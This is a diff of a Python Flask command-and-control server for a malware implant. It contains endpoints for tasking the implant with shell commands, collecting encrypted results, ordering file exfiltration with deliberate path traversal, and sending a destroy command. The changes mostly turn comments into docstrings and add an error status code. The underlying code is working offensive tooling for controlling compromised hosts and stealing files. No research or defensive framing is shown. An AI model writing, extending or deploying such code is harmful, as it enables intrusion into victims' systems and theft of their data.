@@ -162,9 +162,11 @@ def beacon():
 
 @app.route("/task", methods=["POST"])
 def task():
-    # operator calls this endpoint with "cmd" (str) param to add task
-    # implant receives tasks when pinging BEACON_ENDPOINT
-    # implant uploads results to RESULTS_ENDPOINT
+    """
+    Operator calls this endpoint with "cmd" (str) param to add tasks (shell cmds)
+    Implant receives tasks when pinging BEACON_ENDPOINT
+    Implant uploads results to RESULTS_ENDPOINT
+    """
     data = request.json
     print("[*] TASKS\n", data)
     command: str = data.get("cmd")
@@ -175,7 +177,7 @@ def task():
 
 @app.route(RESULTS_ENDPOINT, methods=["POST"])
 def task_result():
-    # implant uses this endpoint to upload results of tasks
+    """Implant uses this endpoint to upload results of tasks"""
     enc = request.get_data().decode()
     plain = decrypt_data(derived_key, enc)
     json_data = json.loads(plain)
@@ -188,8 +190,10 @@ def task_result():
 
 @app.route("/exfil", methods=["POST"])
 def queue_exfil():
-    # operator calls this with "files" (list[str]) param to tell implant which files to exfiltrate
-    # implant will respond to FILE_ENDPOINT
+    """
+    Operator calls this with "files" (list[str]) param to tell implant which files to exfiltrate
+    Implant will respond to FILE_ENDPOINT
+    """
     data = request.json
     files = data.get("files")
 
@@ -200,7 +204,7 @@ def queue_exfil():
     if (not files or not isinstance(files, list)) or (
         files and not isinstance(files[0], str)
     ):
-        return "[!] Request must include 'files' param as list[str]"
+        return "[!] Request must include 'files' param as list[str]", 400
 
     for filename in files:
         # don't secure filename because we want file traversal
@@ -211,12 +215,14 @@ def queue_exfil():
 
 @app.route(FILE_ENDPOINT, methods=["POST"])
 def recv_file():
-    # implant uses this endpoint to upload encrypted files in "files" field
-    # decrypted files are uploaded in UPLOAD_FOLDER with a timestamp appended
+    """
+    Implant uses this endpoint to upload encrypted files in "files" field
+    Decrypted files are uploaded in UPLOAD_FOLDER with a timestamp appended
+    """
     if "file" not in request.files:
         return "", 400
 
-    enc_file = request.files.get("file")  # Flask FileStorage object
+    enc_file = request.files.get("file")  # flask FileStorage object
     # decrypt file
     file_bytes = decrypt_data(derived_key, enc_file.read(), False)
 
@@ -230,7 +236,7 @@ def recv_file():
 
 @app.route("/destroy", methods=["POST"])
 def destroy():
-    # operator calls this to replace all tasks with final "destroy" task
+    """Operator calls this to replace all tasks with final "destroy" task"""
     tasks.clear()
     tasks.append("DESTROY")
     return jsonify({"status": "sent destroy task"})
